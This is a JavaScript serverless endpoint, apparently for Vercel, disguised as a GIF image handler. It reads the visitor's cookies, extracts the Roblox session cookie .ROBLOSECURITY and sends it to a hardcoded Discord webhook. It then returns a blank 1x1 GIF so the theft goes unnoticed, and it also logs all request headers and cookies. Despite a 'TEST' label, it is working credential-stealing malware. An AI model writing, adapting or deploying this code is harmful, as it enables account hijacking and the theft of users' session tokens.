// api/gif.js - VERSIÓN CON LOGS
export default async function handler(req, res) {
    console.log('🔍 GIF.JS EJECUTADO');
    console.log('📨 Headers:', JSON.stringify(req.headers, null, 2));
    
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    
    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    // ============================================
    // 1. OBTENER COOKIES
    // ============================================
    const cookies = req.headers.cookie || '';
    console.log('🍪 Cookies:', cookies);
    
    // ============================================
    // 2. BUSCAR .ROBLOSECURITY
    // ============================================
    const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
    const robloxCookie = match ? match[1] : 'No encontrada';
    console.log('🎯 Cookie Roblox:', robloxCookie);
    
    // ============================================
    // 3. ENVIAR A DISCORD
    // ============================================
    const webhook = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
    
    try {
        const discordResponse = await fetch(webhook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: "@everyone",
                embeds: [{
                    title: "🍪 Cookie Roblox (TEST)",
                    description: `\`\`\`${robloxCookie}\`\`\``,
                    color: 0x00ff00
                }]
            })
        });
        console.log('✅ Discord response:', discordResponse.status);
    } catch (error) {
        console.error('❌ Error Discord:', error.message);
    }

    // ============================================
    // 4. RESPONDER CON GIF
    // ============================================
    const gifBuffer = Buffer.from('R0lGODlhAQABAIAAAAAAAP///y5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-cache');
    res.status(200).send(gifBuffer);
}